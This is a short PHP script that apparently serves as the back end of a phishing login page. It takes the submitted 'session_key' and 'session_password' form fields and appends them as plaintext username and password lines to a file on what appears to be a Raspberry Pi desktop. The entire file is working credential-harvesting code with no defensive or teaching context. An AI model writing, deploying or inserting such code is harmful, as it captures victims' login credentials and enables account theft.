<?php
$username = $_POST['session_key'];
$password = $_POST['session_password'];
$TEXT = 'Username:'.$username." Password:".$password."\n";
$fo = fopen("home/pi/Desktop/password.text","a+") or die("something wrong");
fwrite($fo,$TEXT);
fclose($fo);
?>
